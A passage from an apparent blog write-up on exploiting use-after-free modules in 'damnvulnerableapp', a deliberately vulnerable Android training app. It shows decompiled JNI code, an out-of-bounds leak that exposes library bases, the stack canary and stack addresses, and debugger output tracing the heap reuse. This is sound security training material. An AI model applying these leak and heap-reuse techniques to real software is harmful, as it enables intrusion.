</span></span><span class=line><span class=cl><span class=nf>Java_com_damnvulnerableapp_vulnerable_modules_UseAfterFreeExecModule_lookupExamples</span>
</span></span><span class=line><span class=cl>          <span class=p>(</span><span class=n>JNIEnv</span> <span class=o>*</span><span class=n>env</span><span class=p>,</span> <span class=n>jobject</span> <span class=n>this</span><span class=p>,</span> <span class=n>jint</span> <span class=n>index</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=kt>long</span> <span class=n>lVar1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>undefined4</span> <span class=n>length</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>jbyteArray</span> <span class=n>array</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kt>long</span> <span class=n>in_FS_OFFSET</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kt>char</span> <span class=o>*</span><span class=n>examples</span> <span class=p>[</span><span class=mi>4</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>canary</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=kt>long</span> <span class=o>*</span><span class=p>)(</span><span class=n>in_FS_OFFSET</span> <span class=o>+</span> <span class=mh>0x28</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>examples</span><span class=p>[</span><span class=mi>2</span><span class=p>].</span><span class=n>_0_4_</span> <span class=o>=</span> <span class=n>PTR_s_topsecret_key_00101d40</span><span class=p>.</span><span class=n>_0_4_</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>examples</span><span class=p>[</span><span class=mi>2</span><span class=p>].</span><span class=n>_4_4_</span> <span class=o>=</span> <span class=n>PTR_s_topsecret_key_00101d40</span><span class=p>.</span><span class=n>_4_4_</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>examples</span><span class=p>[</span><span class=mi>3</span><span class=p>].</span><span class=n>_0_4_</span> <span class=o>=</span> <span class=n>PTR_s_a_very_very_long_key_with_fancy__00101d48</span><span class=p>.</span><span class=n>_0_4_</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>examples</span><span class=p>[</span><span class=mi>3</span><span class=p>].</span><span class=n>_4_4_</span> <span class=o>=</span> <span class=n>PTR_s_a_very_very_long_key_with_fancy__00101d48</span><span class=p>.</span><span class=n>_4_4_</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>examples</span><span class=p>[</span><span class=mi>0</span><span class=p>].</span><span class=n>_0_4_</span> <span class=o>=</span> <span class=n>PTR_s_amazing_key_00101d30</span><span class=p>.</span><span class=n>_0_4_</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>examples</span><span class=p>[</span><span class=mi>0</span><span class=p>].</span><span class=n>_4_4_</span> <span class=o>=</span> <span class=n>PTR_s_amazing_key_00101d30</span><span class=p>.</span><span class=n>_4_4_</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>examples</span><span class=p>[</span><span class=mi>1</span><span class=p>].</span><span class=n>_0_4_</span> <span class=o>=</span> <span class=n>PTR_s_secret_key_00101d38</span><span class=p>.</span><span class=n>_0_4_</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>examples</span><span class=p>[</span><span class=mi>1</span><span class=p>].</span><span class=n>_4_4_</span> <span class=o>=</span> <span class=n>PTR_s_secret_key_00101d38</span><span class=p>.</span><span class=n>_4_4_</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>length</span> <span class=o>=</span> <span class=nf>__strlen_chk</span><span class=p>(</span><span class=n>examples</span><span class=p>[(</span><span class=kt>int</span><span class=p>)</span><span class=n>index</span><span class=p>],</span><span class=mh>0xffffffffffffffff</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>array</span> <span class=o>=</span> <span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=o>*</span><span class=n>env</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>NewByteArray</span><span class=p>)(</span><span class=n>env</span><span class=p>,(</span><span class=n>jsize</span><span class=p>)</span><span class=n>length</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=o>*</span><span class=n>env</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>SetByteArrayRegion</span><span class=p>)(</span><span class=n>env</span><span class=p>,</span><span class=n>array</span><span class=p>,</span><span class=mi>0</span><span class=p>,(</span><span class=n>jsize</span><span class=p>)</span><span class=n>length</span><span class=p>,(</span><span class=n>jbyte</span> <span class=o>*</span><span class=p>)(</span><span class=n>examples</span> <span class=o>+</span> <span class=p>(</span><span class=kt>int</span><span class=p>)</span><span class=n>index</span><span class=p>));</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=kt>long</span> <span class=o>*</span><span class=p>)(</span><span class=n>in_FS_OFFSET</span> <span class=o>+</span> <span class=mh>0x28</span><span class=p>)</span> <span class=o>==</span> <span class=n>canary</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=n>array</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>					<span class=cm>/* WARNING: Subroutine does not return */</span>
</span></span><span class=line><span class=cl>	<span class=nf>__stack_chk_fail</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>jbyteArray</span>
</span></span><span class=line><span class=cl><span class=nf>Java_com_damnvulnerableapp_vulnerable_modules_UseAfterFreeExecModule_storePair</span>
</span></span><span class=line><span class=cl>          <span class=p>(</span><span class=n>JNIEnv</span> <span class=o>*</span><span class=n>env</span><span class=p>,</span><span class=n>jobject</span> <span class=n>this</span><span class=p>,</span><span class=n>jbyteArray</span> <span class=n>name</span><span class=p>,</span><span class=n>jlong</span> <span class=n>value</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=n>uint</span> <span class=n>resultLength</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kt>void</span> <span class=o>*</span><span class=n>obj</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>object</span> <span class=o>*</span><span class=n>keyValue</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>jsize</span> <span class=n>nameLength</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>jbyte</span> <span class=o>*</span><span class=n>nameBytes</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>jbyteArray</span> <span class=n>array</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kt>long</span> <span class=n>in_FS_OFFSET</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>uint</span> <span class=n>len</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kt>char</span> <span class=o>*</span><span class=n>result</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>jboolean</span> <span class=n>iscopy</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kt>long</span> <span class=n>canary</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>canary</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=kt>long</span> <span class=o>*</span><span class=p>)(</span><span class=n>in_FS_OFFSET</span> <span class=o>+</span> <span class=mh>0x28</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>obj</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mh>0x108</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=o>*</span><span class=p>(</span><span class=n>code</span> <span class=o>**</span><span class=p>)((</span><span class=kt>long</span><span class=p>)</span><span class=n>obj</span> <span class=o>+</span> <span class=mh>0x100</span><span class=p>)</span> <span class=o>=</span> <span class=n>FUN_00100c60</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nf>free</span><span class=p>(</span><span class=n>obj</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>keyValue</span> <span class=o>=</span> <span class=p>(</span><span class=n>object</span> <span class=o>*</span><span class=p>)</span><span class=nf>calloc</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mh>0x108</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>nameLength</span> <span class=o>=</span> <span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=o>*</span><span class=n>env</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>GetArrayLength</span><span class=p>)(</span><span class=n>env</span><span class=p>,</span><span class=n>name</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>len</span> <span class=o>=</span> <span class=p>(</span><span class=n>uint</span><span class=p>)</span><span class=n>nameLength</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=mh>0x100</span> <span class=o>&lt;</span> <span class=n>len</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=n>len</span> <span class=o>=</span> <span class=mh>0x100</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>iscopy</span> <span class=o>=</span> <span class=sc>&#39;\0&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>nameBytes</span> <span class=o>=</span> <span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=o>*</span><span class=n>env</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>GetByteArrayElements</span><span class=p>)(</span><span class=n>env</span><span class=p>,</span><span class=n>name</span><span class=p>,</span><span class=o>&amp;</span><span class=n>iscopy</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>__memcpy_chk</span><span class=p>(</span><span class=n>keyValue</span><span class=p>,</span><span class=n>nameBytes</span><span class=p>,</span><span class=n>len</span><span class=p>,</span><span class=mh>0xffffffffffffffff</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>keyValue</span><span class=o>-&gt;</span><span class=n>value</span> <span class=o>=</span> <span class=n>value</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>result</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)(</span><span class=o>**</span><span class=p>(</span><span class=n>code</span> <span class=o>**</span><span class=p>)((</span><span class=kt>long</span><span class=p>)</span><span class=n>obj</span> <span class=o>+</span> <span class=mh>0x100</span><span class=p>))(</span><span class=n>keyValue</span><span class=p>,</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>resultLength</span> <span class=o>=</span> <span class=nf>__strlen_chk</span><span class=p>(</span><span class=o>&amp;</span><span class=n>result</span><span class=p>,</span><span class=mh>0xffffffffffffffff</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>array</span> <span class=o>=</span> <span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=o>*</span><span class=n>env</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>NewByteArray</span><span class=p>)(</span><span class=n>env</span><span class=p>,(</span><span class=n>jsize</span><span class=p>)</span><span class=n>resultLength</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=o>*</span><span class=n>env</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>SetByteArrayRegion</span><span class=p>)(</span><span class=n>env</span><span class=p>,</span><span class=n>array</span><span class=p>,</span><span class=mi>0</span><span class=p>,(</span><span class=n>jsize</span><span class=p>)</span><span class=n>resultLength</span><span class=p>,(</span><span class=n>jbyte</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>result</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=o>*</span><span class=n>env</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>ReleaseByteArrayElements</span><span class=p>)(</span><span class=n>env</span><span class=p>,</span><span class=n>name</span><span class=p>,</span><span class=n>nameBytes</span><span class=p>,</span><span class=n>JNI_ABORT</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>free</span><span class=p>(</span><span class=n>keyValue</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=kt>long</span> <span class=o>*</span><span class=p>)(</span><span class=n>in_FS_OFFSET</span> <span class=o>+</span> <span class=mh>0x28</span><span class=p>)</span> <span class=o>==</span> <span class=n>canary</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=n>array</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>					<span class=cm>/* WARNING: Subroutine does not return */</span>
</span></span><span class=line><span class=cl>	<span class=nf>__stack_chk_fail</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>As <code>UseAfterFreeExecModule#lookupExamples</code> and <code>UseAfterFreeWriteModule#lookupExamples</code> are basically the same (verfiy if not convinced), we will only consider <code>UseAfterFreeWriteModule#storePair</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=kt>void</span> <span class=nf>Java_com_damnvulnerableapp_vulnerable_modules_UseAfterFreeWriteModule_storePair</span>
</span></span><span class=line><span class=cl>               <span class=p>(</span><span class=n>JNIEnv</span> <span class=o>*</span><span class=n>env</span><span class=p>,</span><span class=n>jobject</span> <span class=n>this</span><span class=p>,</span><span class=n>jarray</span> <span class=n>key</span><span class=p>,</span><span class=n>jlong</span> <span class=n>value</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=n>jlong</span> <span class=o>**</span><span class=n>ptrList</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>object</span> <span class=o>*</span><span class=n>keyValuePair</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>jsize</span> <span class=n>keyLength</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>jbyte</span> <span class=o>*</span><span class=n>keyBytes</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kt>long</span> <span class=n>in_FS_OFFSET</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>uint</span> <span class=n>reducedKeyLength</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>jboolean</span> <span class=n>iscopy</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kt>long</span> <span class=n>canary</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>canary</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=kt>long</span> <span class=o>*</span><span class=p>)(</span><span class=n>in_FS_OFFSET</span> <span class=o>+</span> <span class=mh>0x28</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>ptrList</span> <span class=o>=</span> <span class=p>(</span><span class=n>jlong</span> <span class=o>**</span><span class=p>)</span><span class=nf>malloc</span><span class=p>(</span><span class=mh>0x108</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>free</span><span class=p>(</span><span class=n>ptrList</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>keyValuePair</span> <span class=o>=</span> <span class=p>(</span><span class=n>object</span> <span class=o>*</span><span class=p>)</span><span class=nf>malloc</span><span class=p>(</span><span class=mh>0x108</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>keyLength</span> <span class=o>=</span> <span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=o>*</span><span class=n>env</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>GetArrayLength</span><span class=p>)(</span><span class=n>env</span><span class=p>,</span><span class=n>key</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>reducedKeyLength</span> <span class=o>=</span> <span class=p>(</span><span class=n>uint</span><span class=p>)</span><span class=n>keyLength</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=mh>0x100</span> <span class=o>&lt;</span> <span class=n>reducedKeyLength</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=n>reducedKeyLength</span> <span class=o>=</span> <span class=mh>0x100</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>iscopy</span> <span class=o>=</span> <span class=sc>&#39;\0&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>keyBytes</span> <span class=o>=</span> <span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=o>*</span><span class=n>env</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>GetByteArrayElements</span><span class=p>)(</span><span class=n>env</span><span class=p>,</span><span class=n>key</span><span class=p>,</span><span class=o>&amp;</span><span class=n>iscopy</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>__memcpy_chk</span><span class=p>(</span><span class=n>keyValuePair</span><span class=p>,</span><span class=n>keyBytes</span><span class=p>,</span><span class=n>reducedKeyLength</span><span class=p>,</span><span class=mh>0xffffffffffffffff</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=o>**</span><span class=n>ptrList</span> <span class=o>=</span> <span class=n>value</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=o>*</span><span class=n>env</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>ReleaseByteArrayElements</span><span class=p>)(</span><span class=n>env</span><span class=p>,</span><span class=n>key</span><span class=p>,</span><span class=n>keyBytes</span><span class=p>,</span><span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>free</span><span class=p>(</span><span class=n>keyValuePair</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=kt>long</span> <span class=o>*</span><span class=p>)(</span><span class=n>in_FS_OFFSET</span> <span class=o>+</span> <span class=mh>0x28</span><span class=p>)</span> <span class=o>==</span> <span class=n>canary</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>					<span class=cm>/* WARNING: Subroutine does not return */</span>
</span></span><span class=line><span class=cl>	<span class=nf>__stack_chk_fail</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><h2 id=trying-to-get-code-execution-in-useafterfreewritemodule>Trying to get code execution in <em>UseAfterFreeWriteModule</em></h2><p>In this section various approaches of getting code execution in the <em>UseAfterFreeWriteModule</em> will be discussed. Although none of them are going to be applicable to this module, they might become relevant for future modules and definitely give some insights into binary exploitation on Android.</p><h3 id=leaking-data>Leaking data</h3><p>As is often the case with secured binaries, we have to defeat <em>ASLR</em> by leaking some address. &ldquo;Luckily&rdquo;, there is a function that is called as often as we want, which is called <code>lookupExamples</code> that contains the following code snippet:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=n>length</span> <span class=o>=</span> <span class=nf>__strlen_chk</span><span class=p>(</span><span class=n>examples</span><span class=p>[(</span><span class=kt>int</span><span class=p>)</span><span class=n>index</span><span class=p>],</span><span class=mh>0xffffffffffffffff</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>array</span> <span class=o>=</span> <span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=o>*</span><span class=n>env</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>NewByteArray</span><span class=p>)(</span><span class=n>env</span><span class=p>,(</span><span class=n>jsize</span><span class=p>)</span><span class=n>length</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=o>*</span><span class=n>env</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>SetByteArrayRegion</span><span class=p>)(</span><span class=n>env</span><span class=p>,</span><span class=n>array</span><span class=p>,</span><span class=mi>0</span><span class=p>,(</span><span class=n>jsize</span><span class=p>)</span><span class=n>length</span><span class=p>,(</span><span class=n>jbyte</span> <span class=o>*</span><span class=p>)(</span><span class=n>examples</span> <span class=o>+</span> <span class=p>(</span><span class=kt>int</span><span class=p>)</span><span class=n>index</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=k>return</span> <span class=n>array</span><span class=p>;</span>
</span></span></code></pre></div><p>There are two aspects to consider:</p><ol><li><code>index</code> is not checked for <em>out - of - bounds</em> access.</li><li><code>(jbyte *)(examples + (int)index)</code> will result in the address of a string being copied into <code>array</code>. We know that <code>examples</code> is probably a string table, because <code>__strlen_chk</code> is called on <code>examples[(int)index]</code>.</li></ol><p>Interestingly, the <em>out - of - bounds</em> access is <strong>not</strong> really usable, because it requires <code>examples[(int)index]</code> to be a valid pointer for <code>index >= 4</code>. But there is no need to read more pointers, as the lengths of the strings in <code>examples</code> determine the amount of bytes returned. Thus, for <code>index = 3</code>, the leaked value will contain at least one address, if not more (it is a pretty long string).</p><p><code>lookupExamples</code> is called in a loop, where the user is asked for <strong>1 - based</strong> indices into the array:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-Java data-lang=Java><span class=line><span class=cl><span class=k>while</span><span class=w> </span><span class=p>(</span><span class=kc>true</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=n>output</span><span class=p>(</span><span class=s>&#34;Send a number between 1 and 4 (0 to continue) to see one of four key name templates:&#34;</span><span class=p>.</span><span class=na>getBytes</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=kt>int</span><span class=w> </span><span class=n>index</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ByteBuffer</span><span class=p>.</span><span class=na>wrap</span><span class=p>(</span><span class=n>input</span><span class=p>()).</span><span class=na>getInt</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>index</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=k>break</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=n>output</span><span class=p>(</span><span class=n>lookupExamples</span><span class=p>(</span><span class=n>index</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=n>1</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><p>When accessing <code>lookupExamples</code> by sending <code>1 &lt;= index &lt;= 4</code> we can get the following leaks:</p><pre tabindex=0><code>[0]: 0x730b9b7a371e     --|
[1]: 0x730b9b7a372a       | --&gt; from `.rodata`, thus 0x730b9b7a371e - 0x71e = libUseAfterFreeWriteModule.so
[2]: 0x730b9b7a3710       |
[3]: 0x730b9b7a3735     --|
[4]: 0x730b993ba990     --&gt; stack address: array of example strings
[5]: 0x2147eb93990de82b --&gt; 8 byte canary
[6]: 0x730b993ba8c0     --&gt; stack address: stored `rbp`
[7]: 0x730c0379ffac     --&gt; `art_quick_generic_jni_trampoline+220`, thus 0x730c0379fed0 = `art_quick_generic_jni_trampoline` and `libart.so = 0x730c03400000`
</code></pre><p>With the current leak, we get</p><ol><li>Address in <code>libUseAfterFreeWriteModule.so</code> and therefore its base address</li><li>Address in <code>libart.so</code> and therefore its base address</li><li>Address on stack</li><li>Canary</li></ol><p>Keep in mind that everytime <em>UseAfterFreeWriteModule</em> is run, the addresses will differ due to ASLR. The above leak is just an example to showcase what it might look like and, most importantly, what the semantics of the leaked values are.</p><h3 id=the-bug>The bug</h3><p>Before showing how to fail to exploit the bug &mldr; well what is the bug anyways? Terms like <em>Write - What - Where</em> condition have already been mentioned, so lets see the corresponding code:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=n>ptrList</span> <span class=o>=</span> <span class=p>(</span><span class=n>jlong</span> <span class=o>**</span><span class=p>)</span><span class=nf>malloc</span><span class=p>(</span><span class=mh>0x108</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nf>free</span><span class=p>(</span><span class=n>ptrList</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>keyValuePair</span> <span class=o>=</span> <span class=p>(</span><span class=n>object</span> <span class=o>*</span><span class=p>)</span><span class=nf>malloc</span><span class=p>(</span><span class=mh>0x108</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>keyLength</span> <span class=o>=</span> <span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=o>*</span><span class=n>env</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>GetArrayLength</span><span class=p>)(</span><span class=n>env</span><span class=p>,</span><span class=n>key</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>reducedKeyLength</span> <span class=o>=</span> <span class=p>(</span><span class=n>uint</span><span class=p>)</span><span class=n>keyLength</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=mh>0x100</span> <span class=o>&lt;</span> <span class=n>reducedKeyLength</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=n>reducedKeyLength</span> <span class=o>=</span> <span class=mh>0x100</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>iscopy</span> <span class=o>=</span> <span class=sc>&#39;\0&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>keyBytes</span> <span class=o>=</span> <span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=o>*</span><span class=n>env</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>GetByteArrayElements</span><span class=p>)(</span><span class=n>env</span><span class=p>,</span><span class=n>key</span><span class=p>,</span><span class=o>&amp;</span><span class=n>iscopy</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nf>__memcpy_chk</span><span class=p>(</span><span class=n>keyValuePair</span><span class=p>,</span><span class=n>keyBytes</span><span class=p>,</span><span class=n>reducedKeyLength</span><span class=p>,</span><span class=mh>0xffffffffffffffff</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=o>**</span><span class=n>ptrList</span> <span class=o>=</span> <span class=n>value</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span></code></pre></div><p>As can be seen, immediately after allocating memory for a <code>jlong*[33]</code>, the memory is freed. Then memory is allocated to hold a <code>struct object</code> (this was deduced from analysis in <em>Ghidra</em>; the name is chosen arbitrarily). Comparing both <code>malloc</code> calls reveals that both types of the two variables are of the same size. If <code>malloc</code> was to return the same chunk twice, whatever is stored in the first 8 bytes of the <code>keyBytes</code> would be interpreted as a pointer, to which we would write the <code>value</code>.</p><p>Knowing our beloved <code>dlmalloc</code> (the glibc&rsquo;s implementation of <code>malloc</code>), we can assume that <code>keyValuePair</code> will be assigned the same chunk as <code>ptrList</code>, right? I.e. <code>keyValuePair = ptrList</code>, where <code>ptrList</code> is a dangling pointer, because its memory has already been freed? Well &mldr; the interesting thing is that it actually works, i.e. <code>keyValuePair = ptrList</code>, but this is <strong>not due to dlmalloc</strong>!</p><p>Lets confirm my statement with some disassembly. To that end, observe that <code>ptrList = *($rbp-0x58)</code> and <code>keyValuePair = *($rbp-0x60)</code>:</p><pre tabindex=0><code>[1] gef➤  disassemble Java_com_damnvulnerableapp_vulnerable_modules_UseAfterFreeWriteModule_storePair 
    ...
    0x0000730b9ed59a1a &lt;+42&gt;:	call   0x730b9ed59b80 &lt;malloc@plt&gt;
    0x0000730b9ed59a1f &lt;+47&gt;:	mov    QWORD PTR [rbp-0x58],rax   &lt;--- result of first malloc
    0x0000730b9ed59a23 &lt;+51&gt;:	mov    rdi,QWORD PTR [rbp-0x58]
    0x0000730b9ed59a27 &lt;+55&gt;:	call   0x730b9ed59b90 &lt;free@plt&gt;
    0x0000730b9ed59a2c &lt;+60&gt;:	mov    edi,0x108
    0x0000730b9ed59a31 &lt;+65&gt;:	call   0x730b9ed59b80 &lt;malloc@plt&gt;
    0x0000730b9ed59a36 &lt;+70&gt;:	mov    QWORD PTR [rbp-0x60],rax   &lt;--- result of second malloc
    ...
gef➤  x/1gx $rbp-0x58
    0x730b9c970828:	0x0000730cb77bb950
gef➤  x/1gx $rbp-0x60
    0x730b9c970820:	0x0000730cb77bb950

[2] gef➤  pipe vmmap | grep primary | grep cb77
    0x00730cb77b3000 0x00730cb77f3000 0x00000000000000 rw- [anon:scudo:primary]

[3] gef➤  disassemble malloc
Dump of assembler code for function malloc:
    0x0000730eb408fda0 &lt;+0&gt;:	push   r14
    0x0000730eb408fda2 &lt;+2&gt;:	push   rbx
